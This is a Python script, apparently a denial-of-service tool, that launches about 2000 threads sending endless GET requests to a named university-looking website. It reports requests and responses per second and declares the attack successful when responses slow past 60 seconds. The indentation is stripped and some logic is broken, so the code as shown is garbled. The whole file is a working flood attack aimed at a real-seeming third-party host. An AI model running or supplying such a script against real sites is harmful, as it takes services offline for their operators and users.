import requests
import threading
import time

response_list = []
request_list = []
def current_ini_time():             #will not change
return round(time.time() * 1000)
def current_sec_time(): #will change
return round(time.time())
def count_response_per_second(time_took):     #counts no. of responses per second
t = current_sec_time()
response_list.append({
"time_took": time_took,
"time_received": t,
})

for e in response_list:
if current_sec_time() - e["time_received"] >= 1:
response_list.remove(e)

def count_req_per_second():
t = current_sec_time()
request_list.append({
"time_received": t,
})

for e in request_list:
if current_sec_time() - e["time_received"] >= 1:
request_list.remove(e)

message = "DoSing..."
def make_request(name):
while True:
count_req_per_second
try:

s = current_ini_time()
r = requests.get('https://thebridge.psgtech.ac.in//')
t = current_ini_time() - s
# print("Response code from thread #{}: {} took {} ms".format(name, str(r.status_code), t))
count_response_per_second(t)
except:
message = "DoS Successful. Site looks down for now."


threads=2000
i=0
while i <= threads:
x = threading.Thread(target=make_request, args=(i,))
print("Starting thread #{}...".format(i))
x.start()
i+=1


print("Calculating... wait for a while for it to adjust...")
while True:
time.sleep(2
            )
response_time = 0
for e in response_list:
response_time = response_time + e['time_took']
if(len(response_list)) > 0:
response_time = response_time / len(response_list)
if response_time > 60000:
message = "DoS Successful. Site looks down for now."
else:
message = "DoSing..."
print("\rAverage response time: {}ms; Requests/sec: {}; Responses/sec: {}; {}".format(round(response_time, 2), len(request_list), len(response_list), message), end=""),

